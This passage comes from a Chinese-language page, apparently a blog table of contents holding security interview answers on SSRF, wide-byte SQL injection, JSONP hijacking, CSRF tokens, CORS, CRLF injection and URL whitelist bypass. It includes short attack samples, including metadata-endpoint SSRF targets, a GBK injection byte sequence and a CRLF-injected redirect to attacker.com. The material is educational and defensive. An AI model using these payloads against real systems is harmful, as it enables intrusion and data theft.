CONFIG、FLUSHDB 等。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9FJava-%E5%92%8C-PHP-%E7%9A%84-SSRF-%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">SSRF 漏洞原理、利用方式及修复方案？Java 和 PHP 的 SSRF 区别？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9ASSRF%EF%BC%88Server-Side-Request-Forgery%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%85%81%E8%AE%B8%E6%94%BB%E5%87%BB%E8%80%85%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%94%B1%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E8%B5%B7%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%86%85%E9%83%A8%E6%88%96%E5%A4%96%E9%83%A8%E6%9C%8D%E5%8A%A1%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%EF%BC%9A%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%E8%AE%BF%E9%97%AE%E5%86%85%E9%83%A8%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%A6%82-http-127-0-0-1-5000-admin%EF%BC%8C%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82%EE%88%86-%E6%8E%A2%E6%B5%8B%E5%85%83%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1%EF%BC%9A%E8%AE%BF%E9%97%AE%E4%BA%91%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%85%83%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%A6%82-AWS-%E7%9A%84-http-169-254-169-254-latest-meta-data-%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%AE%9E%E4%BE%8B%E4%BF%A1%E6%81%AF%E3%80%82-%E5%8F%8D%E5%BC%B9-Shell%EF%BC%9A%E5%88%A9%E7%94%A8%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%88%E5%A6%82-gopher%EF%BC%89%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%BB%E6%9C%BA%EF%BC%8C%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B-shell%E3%80%82%EE%88%86Java-%E5%92%8C-PHP-%E7%9A%84-SSRF-%E5%8C%BA%E5%88%AB%EF%BC%9A-Java%EF%BC%9AHttpURLConnection%E3%80%81Apache-HttpClient-%E7%AD%89%E7%B1%BB%E9%BB%98%E8%AE%A4%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE%EF%BC%8C%E5%8F%AF%E8%83%BD%E8%A2%AB%E7%94%A8%E4%BA%8E-SSRF-%E6%94%BB%E5%87%BB%E3%80%82Java%E9%80%9A%E5%B8%B8%E4%BD%BF%E7%94%A8%E5%A6%82HttpClient%E7%AD%89%E5%BA%93%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%EF%BC%8C%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%AB%E6%B3%A8%E6%84%8F%E5%BA%93%E7%9A%84%E9%85%8D%E7%BD%AE%E4%BB%A5%E9%81%BF%E5%85%8DSSRF%E6%BC%8F%E6%B4%9E%E3%80%82-PHP%EF%BC%9Afile-get-contents%E3%80%81cURL-%E7%AD%89%E5%87%BD%E6%95%B0%E5%8F%AF%E7%94%A8%E4%BA%8E%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%EF%BC%8C%E9%9C%80%E6%B3%A8%E6%84%8F%E5%8D%8F%E8%AE%AE%E9%99%90%E5%88%B6%E3%80%82%EE%88%86%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%8D%8F%E8%AE%AE%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%9A%E9%99%90%E5%88%B6%E8%AF%B7%E6%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%8C%E4%BB%85%E5%85%81%E8%AE%B8-HTTP-%E5%92%8C-HTTPS%E3%80%82-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%EF%BC%9A%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E7%9A%84-URL%EF%BC%8C%E9%98%B2%E6%AD%A2%E9%9D%9E%E6%B3%95%E8%AF%B7%E6%B1%82%E3%80%82-%E9%98%B2%E7%81%AB%E5%A2%99%E9%99%90%E5%88%B6%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E9%99%90%E5%88%B6%E5%AF%B9%E5%86%85%E9%83%A8%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%AE%BF%E9%97%AE%E3%80%82-%E4%BA%91%E5%85%83%E6%95%B0%E6%8D%AE%E9%98%B2%E6%8A%A4%EF%BC%9A%E5%9C%A8%E4%BA%91%E7%8E%AF%E5%A2%83%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E9%99%90%E5%88%B6%E5%AF%B9%E5%85%83%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%AE%BF%E9%97%AE%E3%80%82"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理：SSRF（Server-Side Request Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。利用方式：- 访问内网服务：通过构造请求访问内部服务，如 http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;admin，获取敏感信息。- 探测元数据服务：访问云服务的元数据接口，如 AWS 的 http:&#x2F;&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;，获取实例信息。- 反弹 Shell：利用支持的协议（如 gopher）构造请求，反向连接攻击者主机，获取远程 shell。Java 和 PHP 的 SSRF 区别：- Java：HttpURLConnection、Apache HttpClient 等类默认支持多种协议，可能被用于 SSRF 攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。- PHP：file_get_contents、cURL 等函数可用于发起请求，需注意协议限制。修复方案：- 协议白名单：限制请求协议，仅允许 HTTP 和 HTTPS。- 输入验证：严格验证用户输入的 URL，防止非法请求。- 防火墙限制：使用防火墙规则限制对内部服务的访问。- 云元数据防护：在云环境中，使用防火墙规则限制对元数据服务的访问。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9F"><span class="toc-number">3.1.</span> <span class="toc-text">宽字节注入漏洞原理、利用方式及修复方案？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%A4%9A%E5%AD%97%E8%8A%82%E7%BC%96%E7%A0%81%EF%BC%88%E5%A6%82-GBK%EF%BC%89%E7%89%B9%E6%80%A7%EF%BC%8C%E7%BB%95%E8%BF%87%E5%8D%95%E5%AD%97%E8%8A%82%E5%AD%97%E7%AC%A6%E9%9B%86%E7%9A%84%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%AF%BC%E8%87%B4-SQL-%E6%B3%A8%E5%85%A5%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%EF%BC%9A%E5%9C%A8-GBK-%E7%BC%96%E7%A0%81%E4%B8%8B%EF%BC%8C-df-5c-27-%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BA-%EF%BC%8C%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%8C%E5%AF%BC%E8%87%B4-SQL-%E6%B3%A8%E5%85%A5%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%BB%9F%E4%B8%80%E7%BC%96%E7%A0%81%EF%BC%9A%E4%BD%BF%E7%94%A8-UTF-8-%E7%BC%96%E7%A0%81%EF%BC%8C%E9%81%BF%E5%85%8D%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E3%80%82-%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5%EF%BC%8C%E9%81%BF%E5%85%8D%E7%9B%B4%E6%8E%A5%E6%8B%BC%E6%8E%A5-SQL%E3%80%82-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%EF%BC%9A%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%81%B6%E6%84%8F%E5%AD%97%E7%AC%A6%E3%80%82"><span class="toc-number">4.</span> <span class="toc-text">漏洞原理：宽字节注入利用多字节编码（如 GBK）特性，绕过单字节字符集的过滤，导致 SQL 注入。利用方式：- 绕过过滤：在 GBK 编码下，%df%5c%27 被解析为 &#39;，绕过过滤器，导致 SQL 注入。修复方案：- 统一编码：使用 UTF-8 编码，避免宽字节注入。- 参数化查询：使用预编译语句，避免直接拼接 SQL。- 输入验证：严格验证用户输入，防止恶意字符。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP-%E7%9A%84%E4%B8%9A%E5%8A%A1%E6%84%8F%E4%B9%89%E3%80%81JSONP-%E5%8A%AB%E6%8C%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9F%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1-CSRF-Token%EF%BC%9F"><span class="toc-number">4.1.</span> <span class="toc-text">JSONP 的业务意义、JSONP 劫持利用方式及修复方案？如何设计 CSRF Token？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP-%E7%9A%84%E4%B8%9A%E5%8A%A1%E6%84%8F%E4%B9%89%EF%BC%9AJSONP%EF%BC%88JSON-with-Padding%EF%BC%89%E6%98%AF%E4%B8%80%E7%A7%8D%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%95%B0%E6%8D%AE%E7%9A%84%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%88%A9%E7%94%A8-%E6%A0%87%E7%AD%BE%E7%9A%84%E8%B7%A8%E5%9F%9F%E7%89%B9%E6%80%A7%EF%BC%8C%E5%85%81%E8%AE%B8%E7%BD%91%E9%A1%B5%E4%BB%8E%E5%85%B6%E4%BB%96%E5%9F%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E3%80%82JSONP-%E5%8A%AB%E6%8C%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E5%8A%AB%E6%8C%81%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%88%A9%E7%94%A8-JSONP-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E8%B4%A6%E6%88%B7%E4%BD%99%E9%A2%9D%E3%80%81%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99%E7%AD%89%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%A6%81%E7%94%A8-JSONP%EF%BC%9A%E4%B8%8D%E4%BD%BF%E7%94%A8-JSONP%EF%BC%8C%E6%94%B9%E7%94%A8-CORS-%E7%AD%89%E5%AE%89%E5%85%A8%E7%9A%84%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E3%80%82-%E9%AA%8C%E8%AF%81%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%EF%BC%9A%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%90%8D%EF%BC%8C%E9%98%B2%E6%AD%A2%E8%A2%AB%E7%AF%A1%E6%94%B9%E3%80%82-%E4%BD%BF%E7%94%A8-HTTPS%EF%BC%9A%E9%80%9A%E8%BF%87-HTTPS-%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%EF%BC%8C%E9%98%B2%E6%AD%A2%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E3%80%82%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1-CSRF-Token%EF%BC%9A-%E7%94%9F%E6%88%90-Token%EF%BC%9A%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E7%9A%84-CSRF-Token%EF%BC%8C%E5%B9%B6%E4%B8%8E%E7%94%A8%E6%88%B7%E4%BC%9A%E8%AF%9D%E5%85%B3%E8%81%94%E3%80%82-%E5%B5%8C%E5%85%A5-Token%EF%BC%9A%E5%9C%A8%E6%AF%8F%E4%B8%AA%E8%A1%A8%E5%8D%95%E4%B8%AD%E5%B5%8C%E5%85%A5%E8%AF%A5-Token%EF%BC%8C%E4%BD%9C%E4%B8%BA%E9%9A%90%E8%97%8F%E5%AD%97%E6%AE%B5%E3%80%82-%E9%AA%8C%E8%AF%81-Token%EF%BC%9A%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E4%B8%AD%E7%9A%84-Token-%E6%98%AF%E5%90%A6%E4%B8%8E%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E4%B8%80%E8%87%B4%E3%80%82-%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-%E7%94%9F%E6%88%90-Token%EF%BC%88PHP%EF%BC%89%EF%BC%9A-%E5%B5%8C%E5%85%A5-Token%EF%BC%88HTML%EF%BC%89%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">JSONP 的业务意义：JSONP（JSON with Padding）是一种跨域请求数据的技术，利用 &lt;script&gt; 标签的跨域特性，允许网页从其他域获取数据。JSONP 劫持利用方式：- 劫持敏感数据：攻击者构造恶意页面，利用 JSONP 获取用户敏感信息，如账户余额、个人资料等。修复方案：- 禁用 JSONP：不使用 JSONP，改用 CORS 等安全的跨域请求方式。- 验证回调函数：严格验证回调函数名，防止被篡改。- 使用 HTTPS：通过 HTTPS 加密传输，防止中间人攻击。如何设计 CSRF Token：- 生成 Token：在服务器端生成随机的 CSRF Token，并与用户会话关联。- 嵌入 Token：在每个表单中嵌入该 Token，作为隐藏字段。- 验证 Token：在服务器端验证请求中的 Token 是否与会话中的一致。- 示例代码：  - 生成 Token（PHP）：    1234session_start();if (empty($_SESSION[&#39;csrf_token&#39;])) {    $_SESSION[&#39;csrf_token&#39;] &#x3D; bin2hex(random_bytes(32));}  - 嵌入 Token（HTML）：    1234&lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;&#x2F;submit&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;csrf_token&quot; value&#x3D;&quot;&lt;?php echo $_SESSION[&#39;csrf_token&#39;]; ?&gt;&quot;&gt;    &lt;!-- 其他表单字段 --&gt;&lt;&#x2F;form </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E5%8F%8A%E4%BF%AE%E5%A4%8D%EF%BC%9F"><span class="toc-number">5.1.</span> <span class="toc-text">CORS 原理、利用及修复？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS-%E5%8E%9F%E7%90%86%EF%BC%9A%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%88CORS%EF%BC%89%E6%98%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%EF%BC%8C%E6%97%A8%E5%9C%A8%E9%99%90%E5%88%B6%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E8%B5%84%E6%BA%90%E5%8F%AF%E4%BB%A5%E8%A2%AB%E5%85%B6%E4%BB%96%E5%9F%9F%E7%9A%84%E7%BD%91%E9%A1%B5%E6%89%80%E8%AE%BF%E9%97%AE%E3%80%82%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8D%E5%85%81%E8%AE%B8%E4%BB%8E%E4%B8%8D%E5%90%8C%E6%BA%90%E5%8A%A0%E8%BD%BD%E8%B5%84%E6%BA%90%EF%BC%8C%E9%99%A4%E9%9D%9E%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%A8%E5%93%8D%E5%BA%94%E5%A4%B4%E4%B8%AD%E8%AE%BE%E7%BD%AE%E4%BA%86-Access-Control-Allow-Origin%EF%BC%8C%E6%8C%87%E5%AE%9A%E5%93%AA%E4%BA%9B%E5%9F%9F%E5%90%8D%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E8%AF%A5%E8%B5%84%E6%BA%90%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E7%BD%91%E9%A1%B5%EF%BC%8C%E8%AF%B1%E4%BD%BF%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E7%AB%99%E7%82%B9%EF%BC%8C%E5%88%A9%E7%94%A8%E7%9B%AE%E6%A0%87%E7%AB%99%E7%82%B9%E7%9A%84-CORS-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%AA%83%E5%8F%96%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E3%80%82%E4%BE%8B%E5%A6%82%EF%BC%9A-%E6%94%BB%E5%87%BB%E8%80%85%E7%AB%99%E7%82%B9%E9%80%9A%E8%BF%87-%E8%AF%B7%E6%B1%82%E7%9B%AE%E6%A0%87%E7%AB%99%E7%82%B9%EF%BC%8C%E8%8B%A5%E7%9B%AE%E6%A0%87%E7%AB%99%E7%82%B9%E6%9C%AA%E6%AD%A3%E7%A1%AE%E9%85%8D%E7%BD%AE-CORS%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E7%AA%83%E5%8F%96%E6%95%B0%E6%8D%AE%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%85%8D%E7%BD%AE%E4%B8%A5%E6%A0%BC%E7%9A%84-CORS-%E7%AD%96%E7%95%A5%EF%BC%9A%EE%88%83%E5%8F%AA%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A%E7%9A%84%E6%9D%A5%E6%BA%90%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E8%B5%84%E6%BA%90%EF%BC%9A-%E4%BD%BF%E7%94%A8%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82%EF%BC%9A%EE%88%83%E5%90%AF%E7%94%A8-OPTIONS-%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%A1%AE%E4%BF%9D%E8%AF%B7%E6%B1%82%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E3%80%82"><span class="toc-number">6.</span> <span class="toc-text">CORS 原理：跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了 Access-Control-Allow-Origin，指定哪些域名可以访问该资源。利用方式：攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的 CORS 漏洞，窃取敏感数据。例如：- 攻击者站点通过 &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;target.com&#x2F;sensitive-data&quot;&gt; 请求目标站点，若目标站点未正确配置 CORS，攻击者可窃取数据。修复方案：- 配置严格的 CORS 策略：只允许特定的来源域名访问资源：  1Access-Control-Allow-Origin: https:&#x2F;&#x2F;trusted-site.com- 使用预检请求：启用 OPTIONS 请求，确保请求的安全性。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%EF%BC%9F"><span class="toc-number">6.1.</span> <span class="toc-text">CRLF 注入原理？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9ACRLF%EF%BC%88Carriage-Return-Line-Feed%EF%BC%89%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%94%9F%E5%9C%A8%E6%94%BB%E5%87%BB%E8%80%85%E5%90%91-HTTP-%E5%93%8D%E5%BA%94%E4%B8%AD%E6%8F%92%E5%85%A5%E9%9D%9E%E6%B3%95%E7%9A%84%E6%8D%A2%E8%A1%8C%E7%AC%A6-r-n%EF%BC%8C%E4%BB%A5%E7%A0%B4%E5%9D%8F%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E5%93%8D%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%BD%B1%E5%93%8D-HTTP-%E5%A4%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E6%8F%92%E5%85%A5%E6%81%B6%E6%84%8F%E5%86%85%E5%AE%B9%EF%BC%8C%E5%A6%82%E6%B3%A8%E5%85%A5-HTTP-%E5%93%8D%E5%BA%94%E5%A4%B4%EF%BC%8C%E8%BF%9B%E8%A1%8C%E9%87%8D%E5%AE%9A%E5%90%91%E3%80%81%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89%E7%AD%89%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-HTTP-%E5%A4%B4%E6%B3%A8%E5%85%A5%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87-CRLF-%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%9C%A8%E5%93%8D%E5%BA%94%E4%B8%AD%E6%8F%92%E5%85%A5%E9%A2%9D%E5%A4%96%E7%9A%84%E5%A4%B4%E9%83%A8%EF%BC%8C%E4%BE%8B%E5%A6%82%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%EF%BC%9A%EE%88%83%E8%BF%87%E6%BB%A4%E6%89%80%E6%9C%89%E8%BE%93%E5%85%A5%EF%BC%8C%E9%98%B2%E6%AD%A2%E7%94%A8%E6%88%B7%E6%8F%90%E4%BA%A4%E9%9D%9E%E6%B3%95%E7%9A%84%E6%8D%A2%E8%A1%8C%E7%AC%A6%E6%88%96%E5%9B%9E%E8%BD%A6%E7%AC%A6%E3%80%82-HTTP-%E5%A4%B4%E8%A7%84%E8%8C%83%E5%8C%96%EF%BC%9A%EE%88%83%E7%A1%AE%E4%BF%9D%E6%89%80%E6%9C%89-HTTP-%E5%A4%B4%E9%81%B5%E5%BE%AA%E6%A0%87%E5%87%86%E6%A0%BC%E5%BC%8F%EF%BC%8C%E9%81%BF%E5%85%8D%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E5%AD%97%E7%AC%A6%E6%8F%92%E5%85%A5%E3%80%82"><span class="toc-number">7.</span> <span class="toc-text">漏洞原理：CRLF（Carriage Return Line Feed）注入漏洞发生在攻击者向 HTTP 响应中插入非法的换行符 \r\n，以破坏服务器对响应的处理，从而影响 HTTP 头的解析。攻击者可以插入恶意内容，如注入 HTTP 响应头，进行重定向、跨站脚本攻击（XSS）等。利用方式：- HTTP 头注入：攻击者可以通过 CRLF 注入，在响应中插入额外的头部，例如重定向：  1234HTTP&#x2F;1.1 200 OKContent-Type: text&#x2F;htmlSet-Cookie: sessionid&#x3D;malicious_value; path&#x3D;&#x2F;; HttpOnlyLocation: http:&#x2F;&#x2F;attacker.com&#x2F;malicious修复方案：- 输入验证：过滤所有输入，防止用户提交非法的换行符或回车符。- HTTP 头规范化：确保所有 HTTP 头遵循标准格式，避免不必要的字符插入。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-%E7%99%BD%E5%90%8D%E5%8D%95%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="toc-number">7.1.</span> <span class="toc-text">URL 白名单如何绕过？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9AURL-%E7%99%BD%E5%90%8D%E5%8D%95%E5%B8%B8%E7%94%A8%E4%BA%8E%E9%99%90%E5%88%B6%E7%94%A8%E6%88%B7%E8%AF%B7%E6%B1%82%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%8F%AA%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A%E7%9A%84%E5%9F%9F%E5%90%8D%E6%88%96%E8%B7%AF%E5%BE%84%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9F%90%E4%BA%9B%E6%8A%80%E6%9C%AF%E7%BB%95%E8%BF%87%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%8C%E5%8F%91%E8%B5%B7%E6%81%B6%E6%84%8F%E8%AF%B7%E6%B1%82%E3%80%82%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E5%8C%85%E6%8B%AC%EF%BC%9A-%E4%BD%BF%E7%94%A8-URL-%E7%BC%96%E7%A0%81%EF%BC%9A%E5%A6%82-http-example-com-2F-2E-2E-2F%EF%BC%88%E9%80%9A%E8%BF%87-URL-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E8%B7%AF%E5%BE%84%E9%99%90%E5%88%B6%EF%BC%89%E3%80%82-%E4%BD%BF%E7%94%A8-localhost-%E6%88%96-127-0-0-1-%E5%9C%B0%E5%9D%80%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E8%B7%AF%E5%BE%84%E7%BB%95%E8%BF%87%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87-URL-%E7%BC%96%E7%A0%81%E6%88%96%E4%BD%BF%E7%94%A8-DNS-%E9%87%8D%E7%BB%91%E5%AE%9A%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9F%9F%E5%90%8D%E9%99%90%E5%88%B6%EF%BC%9A-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%B8%A5%E6%A0%BC%E7%99%BD%E5%90%8D%E5%8D%95%E8%A7%84%E5%88%99%EF%BC%9A%EE%88%83%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E7%9A%84%E5%9F%9F%E5%90%8D%E5%92%8C%E8%B7%AF%E5%BE%84%EF%BC%8C%E7%A1%AE%E4%BF%9D%E5%8F%AA%E5%85%81%E8%AE%B8%E6%98%8E%E7%A1%AE%E7%9A%84%E5%90%88%E6%B3%95%E5%9C%B0%E5%9D%80%E3%80%8